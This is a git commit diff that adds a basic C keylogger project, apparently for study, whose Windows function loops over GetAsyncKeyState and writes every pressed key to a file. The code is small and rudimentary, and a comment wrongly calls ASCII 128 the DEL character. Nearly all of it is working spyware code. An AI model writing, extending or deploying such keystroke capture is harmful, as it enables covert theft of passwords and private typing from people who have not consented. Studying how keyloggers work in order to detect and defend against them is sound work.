c33e023c1065561b9c8f9c1ff0b8f47b00750090
Lucas Wagner Fernandes <lucaswagner@institutoiracema.org.br>
2023-10-17 16:30:06 -0300

    feat: Add the basic_keylogger project

---
+++ basic_keylogger/main.c
@@ -0,0 +1,19 @@
+#include <stdio.h>
+
+#ifdef _WIN32
+#include <windows.h>
+
+    void windows_keylogger(FILE* file, char key, const char* ascii_table[])
+    {
+        while (1)
+        {
+            Sleep(10); // Wait for 10 ms
+            for(key = 8; key <= 128; key++) // In ASCII, number 8 refers to the backspace char, and number 128 who is the DEL
+            {
+                if(GetAsyncKeyState(key) == -32767) { // If a key is pressed put it on the file
+                    fprintf(file, "%s", ascii_table[key]);
+                }
+            }
+        }
+    }
+#endif
